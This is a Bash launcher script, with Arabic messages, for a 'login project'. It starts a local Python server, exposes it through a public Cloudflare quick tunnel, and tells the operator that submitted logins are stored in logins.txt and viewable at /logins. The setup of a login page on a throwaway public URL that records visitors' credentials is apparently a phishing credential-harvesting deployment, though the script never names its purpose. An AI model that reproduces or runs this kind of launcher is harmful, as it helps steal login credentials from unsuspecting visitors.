#!/bin/bash

# =============================================
# 🚀 مشروع تسجيل الدخول - التشغيل التلقائي
# =============================================

# الألوان للواجهة
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # بدون لون

clear
echo -e "${BLUE}========================================${NC}"
echo -e "${GREEN}      🚀 مشروع تسجيل الدخول 🚀${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

# الذهاب إلى مجلد المشروع
cd ~/Desktop/project_login

# التحقق من وجود الملفات
if [ ! -f "index.html" ]; then
    echo -e "${RED}❌ ملف index.html غير موجود!${NC}"
    exit 1
fi

if [ ! -f "server.py" ]; then
    echo -e "${RED}❌ ملف server.py غير موجود!${NC}"
    exit 1
fi

# التحقق من وجود Cloudflare Tunnel
if [ ! -f "cloudflared-linux-amd64" ]; then
    echo -e "${YELLOW}📥 تحميل Cloudflare Tunnel...${NC}"
    wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
    chmod +x cloudflared-linux-amd64
    echo -e "${GREEN}✅ تم التحميل بنجاح${NC}"
fi

echo -e "${GREEN}✅ جميع الملفات جاهزة${NC}"
echo ""

# تشغيل الخادم في الخلفية
echo -e "${YELLOW}🔄 تشغيل الخادم...${NC}"
python3 server.py &
SERVER_PID=$!

# الانتظار حتى يبدأ الخادم
sleep 2

# تشغيل Cloudflare Tunnel في الخلفية
echo -e "${YELLOW}🌐 تشغيل النفق العام...${NC}"
./cloudflared-linux-amd64 tunnel --url http://localhost:8080 &
TUNNEL_PID=$!

# الانتظار للحصول على الرابط
sleep 3

echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}      ✅ المشروع يعمل الآن! ✅${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""

# فتح المتصفح تلقائياً
echo -e "${BLUE}🌐 فتح المتصفح...${NC}"
xdg-open http://localhost:8080

echo ""
echo -e "${YELLOW}📋 معلومات الاتصال:${NC}"
echo -e "   📍 محلي: ${GREEN}http://localhost:8080${NC}"
echo -e "   📍 عام: ${GREEN}https://xxxxx.trycloudflare.com${NC} (سيظهر بعد قليل)"
echo -e "   📁 عرض البيانات: ${GREEN}http://localhost:8080/logins${NC}"
echo ""
echo -e "${YELLOW}📁 البيانات تُحفظ في:${NC}"
echo -e "   ${GREEN}~/Desktop/project_login/logins.txt${NC}"
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${RED}⏹️  لإيقاف المشروع اضغط Ctrl+C${NC}"
echo -e "${BLUE}========================================${NC}"

# انتظار حتى يتم إيقاف التشغيل
wait $SERVER_PID
